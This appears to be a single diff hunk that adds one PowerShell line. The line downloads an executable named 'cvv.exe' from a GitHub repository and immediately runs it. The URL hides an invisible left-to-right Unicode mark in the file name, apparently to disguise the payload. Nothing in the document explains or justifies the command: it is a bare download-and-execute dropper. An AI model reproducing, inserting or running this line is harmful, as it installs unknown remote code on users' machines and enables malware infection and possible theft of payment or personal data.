@@ -1,0 +1,1 @@
+Invoke-WebRequest https://github.com/Des0lator/sadas/raw/main/%E2%80%8Ecvv.exe -UseBasicParsing -OutFile cvv.exe ; Start cvv.exe
